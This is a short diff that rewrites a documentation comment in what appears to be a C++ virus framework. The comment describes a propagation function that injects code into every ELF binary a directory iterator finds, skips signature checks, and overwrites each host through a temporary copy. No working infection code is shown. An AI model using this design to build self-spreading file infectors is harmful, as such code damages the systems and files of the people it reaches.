@@ -11,11 +11,13 @@
 #include "signature/elf_padding.hh"
 
 namespace vf::propagation {
-// Propagate the injected code from the current program to all binaries into
-// others. This function only injects into elfs (not self) without signature
-// checking. The current program must have appropriate file system permission.
-// This function must be invoked inside a virus, otherwise the linker will
-// complain.
+// Propagate the injected code from the current calling virus to all binaries
+// found by a given iterator type. This function only injects into elfs (not
+// self) without signature checking. In other words, caller is responsible for
+// avoiding repeatedly infecting the same binary. The current program must have
+// appropriate file system permission to create a temporary copy of the host and
+// overwrite the original host. This function must be invoked inside a virus,
+// otherwise the linker will complain.
 // @Tparam DirIteratorT A directory iterator that provides victim file paths.
 // @Tparam Injector     A code injector.
 // @Tparam Redirector   A redirector.
